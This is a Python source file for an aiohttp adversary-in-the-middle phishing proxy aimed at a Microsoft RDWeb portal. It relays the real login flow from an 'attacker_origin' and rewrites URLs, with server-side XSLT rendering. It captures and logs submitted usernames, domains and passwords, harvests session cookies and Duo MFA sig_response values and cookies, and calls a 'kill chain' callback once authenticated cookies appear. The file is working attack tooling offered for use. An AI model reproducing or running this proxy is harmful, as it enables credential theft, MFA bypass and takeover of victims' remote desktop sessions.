"""Core aiohttp reverse proxy — transparent relay of the target RDWeb portal.

Proxies the full auth flow, rewrites only upstream origins (baseurl attribute
is the load-bearing one), captures credentials and cookies, detects Duo MFA
flows, and triggers the kill chain on successful auth.

RDWeb serves XML+XSLT that the browser normally transforms client-side, but
Chrome/Edge are removing XSLT support. We do the transform server-side with
lxml and serve the resulting HTML — identical to what the browser would have
rendered — so the page works in all browsers and all JS/Duo flows are intact.
"""
import asyncio
import gzip
import re
import secrets
import zlib
from urllib.parse import urljoin

import aiohttp
from aiohttp import web

from . import duo as duo_mod
from . import rewrite as rw_mod
from .sessions import SESSION_COOKIE

MAX_BUFFER = 8 * 1024 * 1024


def log(*a):
    print("[relay]", *a, flush=True)


def vlog(cfg, *a):
    if cfg.verbose:
        print("[relay-v]", *a, flush=True)


def strip_relay_cookie(header, sid):
    if not header:
        return None
    keep = [p.strip() for p in header.split(";")
            if p.strip() and not p.strip().startswith(SESSION_COOKIE + "=")]
    return "; ".join(keep) if keep else None


def charset_of(content_type):
    for part in content_type.split(";"):
        p = part.strip().lower()
        if p.startswith("charset="):
            return p[8:] or "utf-8"
    return "utf-8"


def maybe_decompress(data, encoding):
    enc = (encoding or "").lower()
    if enc == "gzip":
        return gzip.decompress(data)
    if enc == "deflate":
        try:
            return zlib.decompress(data)
        except zlib.error:
            return zlib.decompress(data, -zlib.MAX_WBITS)
    return data


_XSL_PI = re.compile(
    r'<\?xml-stylesheet\s+type=["\']text/xsl["\']\s+href=["\']([^"\']+)["\']\s*\?>',
    re.IGNORECASE)
_xsl_cache = {}


async def _xslt_transform(xml_text, page_url, client):
    """Server-side XSLT: fetch the stylesheet and its document() deps, run the
    transform with lxml, return (html_string, True). Falls back to
    (xml_text, False) on any error so the proxy never breaks."""
    m = _XSL_PI.search(xml_text)
    if not m:
        return xml_text, False
    try:
        from lxml import etree
    except ImportError:
        return xml_text, False

    xsl_href = m.group(1)
    xsl_url = xsl_href if xsl_href.startswith("http") else urljoin(page_url, xsl_href)

    async def _fetch(url):
        if url not in _xsl_cache:
            resp = await client.get(url, ssl=False)
            _xsl_cache[url] = await resp.read()
            resp.release()
        return _xsl_cache[url]

    try:
        xsl_bytes = await _fetch(xsl_url)

        # Pre-fetch document() references the XSL will need.
        # RDWeb's Site.xsl uses: document(concat($baseurl,'RDWAStrings.xml'))
        # We extract baseurl from the XML and fetch the strings file so lxml's
        # resolver can serve it without network access during the transform.
        clean_xml = re.sub(r'<\?xml-stylesheet[^?]*\?>\s*', '', xml_text)
        xml_doc = etree.XML(clean_xml.encode("utf-8"))

        baseurl = ""
        root = xml_doc
        if root.get("baseurl"):
            baseurl = root.get("baseurl")

        xsl_text = xsl_bytes.decode("utf-8", "replace")
        for dm in re.finditer(r"""document\s*\(\s*concat\s*\(\s*\$\w+\s*,\s*['"]([^'"]+)['"]\s*\)\s*\)""", xsl_text):
            dep_url = baseurl + dm.group(1)
            if not dep_url.startswith("http"):
                dep_url = urljoin(page_url, dep_url)
            try:
                await _fetch(dep_url)
            except Exception:
                pass

        class _Resolver(etree.Resolver):
            def resolve(self, system_url, public_id, context):
                if system_url in _xsl_cache:
                    return self.resolve_string(_xsl_cache[system_url], context)
                return None

        parser = etree.XMLParser()
        parser.resolvers.add(_Resolver())
        xsl_doc = etree.XML(xsl_bytes, parser)
        transform = etree.XSLT(xsl_doc)
        xml_doc = etree.XML(clean_xml.encode("utf-8"), parser)
        result = transform(xml_doc)
        return str(result), True
    except Exception as e:
        log("XSLT transform failed (%s), passing XML through" % e)
        return xml_text, False


class RelayApp:
    def __init__(self, cfg, store, on_capture=None):
        self.cfg = cfg
        self.store = store
        self.rw = rw_mod.UrlRewriter(cfg)
        self.on_capture = on_capture
        self.clients = {}
        self.bg = set()
        self.timeout = aiohttp.ClientTimeout(total=None, connect=15,
                                             sock_read=180)

    async def close(self):
        for c in self.clients.values():
            await c.close()
        self.clients.clear()

    def client_for(self, sess):
        c = self.clients.get(sess.sid)
        if c is None or c.closed:
            c = aiohttp.ClientSession(
                cookie_jar=aiohttp.DummyCookieJar(),
                timeout=self.timeout,
                connector=aiohttp.TCPConnector(ssl=False, limit=0),
            )
            self.clients[sess.sid] = c
        return c

    def spawn(self, coro):
        t = asyncio.get_running_loop().create_task(coro)
        self.bg.add(t)
        t.add_done_callback(self.bg.discard)
        return t

    async def handle(self, request: web.Request) -> web.StreamResponse:
        if request.path == "/" or request.path == "":
            raise web.HTTPFound("/RDWeb/Pages/en-US/login.aspx")

        cfg = self.cfg
        sid = request.cookies.get(SESSION_COOKIE)
        fresh = sid is None
        if fresh:
            sid = secrets.token_hex(8)
        sess = self.store.get_or_create(sid, ip=request.remote,
                                        ua=request.headers.get("User-Agent"))
        client = self.client_for(sess)

        raw_path = request.raw_path
        upstream_url = cfg.upstream_origin + raw_path
        vlog(cfg, request.method, raw_path, "->", upstream_url)

        body = await request.read()
        ctype = request.headers.get("Content-Type", "")

        creds = None
        if request.method == "POST" and \
                "application/x-www-form-urlencoded" in ctype.lower():
            fields, creds = rw_mod.parse_login_form(body)
            if creds:
                sess.capture_credentials(creds)
                log("CAPTURED creds %s\\%s (pw %d chars) sid=%s" % (
                    creds.get("domain") or "-", creds.get("username"),
                    len(creds.get("password") or ""), sess.sid))
            sr = duo_mod.extract_sig_response(fields)
            if sr:
                sess.capture_duo({"sig_response": sr})
                sess.event("duo_sig_response_captured", len=len(sr))
                log("CAPTURED DUO sig_response sid=%s" % sess.sid)

        hdrs = {}
        for k, v in request.headers.items():
            lk = k.lower()
            if lk in rw_mod.HOP_HEADERS or lk in (
                    "cookie", "host", "accept-encoding", "content-type",
                    "content-length", "referer", "origin"):
                continue
            hdrs[k] = v
        hdrs["Accept-Encoding"] = "identity"
        if ctype:
            hdrs["Content-Type"] = ctype
        cookie_fwd = strip_relay_cookie(request.headers.get("Cookie"), sid)
        if cookie_fwd:
            hdrs["Cookie"] = cookie_fwd
        for h in ("Referer", "Origin"):
            v = request.headers.get(h)
            if v:
                hdrs[h] = v.replace(cfg.attacker_origin, cfg.upstream_origin)

        try:
            resp = await client.request(
                request.method, upstream_url,
                data=body if body or request.method == "POST" else None,
                headers=hdrs, allow_redirects=False)
        except aiohttp.ClientError as e:
            log("upstream error:", repr(e))
            return web.Response(status=502, text="upstream error\n")

        out = web.StreamResponse(status=resp.status, reason=resp.reason)
        for k, v in resp.headers.items():
            lk = k.lower()
            if lk in rw_mod.HOP_HEADERS or lk in (
                    "set-cookie", "date", "location"):
                continue
            out.headers[k] = v

        sc_lines = []
        for line in resp.headers.getall("Set-Cookie", []):
            sc_lines.append(line)
        changed = sess.capture_cookies(sc_lines)
        for line in sc_lines:
            out.headers.add("Set-Cookie", rw_mod.rewrite_set_cookie(line))
            pair = line.split(";", 1)[0]
            if "=" in pair:
                n, _, val = pair.partition("=")
                if duo_mod.duo_cookie_name(n):
                    sess.capture_duo_cookie(n.strip(), val.strip())
        if changed:
            vlog(cfg, "cookies:", changed)
        if fresh:
            sc = "%s=%s; Path=/" % (SESSION_COOKIE, sid)
            if not cfg.no_tls:
                sc += "; Secure"
            sc += "; HttpOnly; SameSite=Lax"
            out.headers.add("Set-Cookie", sc)
        loc = resp.headers.get("Location")
        if loc:
            out.headers["Location"] = self.rw.location(loc)

        if request.method == "HEAD":
            return out

        rctype = resp.headers.get("Content-Type", "")
        disp = resp.headers.get("Content-Disposition", "")
        is_rdp = (request.path.lower().endswith(".rdp")
                  or (".rdp" in disp.lower()))
        is_text = any(rctype.lower().startswith(t) for t in rw_mod.REWRITE_TYPES)

        try:
            if (is_text or is_rdp) and \
                    int(resp.headers.get("Content-Length", "0")) <= MAX_BUFFER:
                raw = await resp.read()
                raw = maybe_decompress(raw,
                                       resp.headers.get("Content-Encoding"))
                cs = charset_of(rctype)
                text = raw.decode(cs, "replace")

                dinfo = duo_mod.detect_duo(text)
                if dinfo:
                    sess.capture_duo(dinfo)
                    sess.event("duo_flow_detected",
                               api_host=dinfo.get("api_host"))
                    log("DUO flow detected on %s (api=%s) sid=%s" % (
                        request.path, dinfo.get("api_host"), sess.sid))

                is_xml = rctype.lower().startswith(("text/xml", "application/xml"))
                if is_xml and "<?xml-stylesheet" in text:
                    text, did = await _xslt_transform(
                        text, upstream_url, client)
                    if did:
                        out.headers["Content-Type"] = "text/html; charset=%s" % cs
                text = self.rw.text(text)
                data = text.encode(cs, "replace")
                out.headers["Content-Length"] = str(len(data))
                await out.prepare(request)
                await out.write(data)
                await out.write_eof()
            else:
                await out.prepare(request)
                async for chunk in resp.content.iter_any():
                    await out.write(chunk)
                await out.write_eof()
        except (ConnectionResetError, aiohttp.ClientConnectionError):
            vlog(cfg, "client/upstream disconnect", request.path)
        finally:
            resp.release()

        if sess.data.get("credentials") and sess.auth_cookie_seen():
            if sess.data["auth_state"] in ("none", "credentials_captured"):
                sess.mark_auth_cookies()
                log("AUTH cookies captured for sid=%s — trigger kill chain"
                    % sess.sid)
                if self.on_capture:
                    self.spawn(self.on_capture(sess))
        return out


def build_app(cfg, store, on_capture=None):
    relay = RelayApp(cfg, store, on_capture=on_capture)
    app = web.Application(client_max_size=MAX_BUFFER)
    app.router.add_route("*", "/{tail:.*}", relay.handle)

    async def _cleanup(app):
        await relay.close()
    app.on_cleanup.append(_cleanup)
    return app
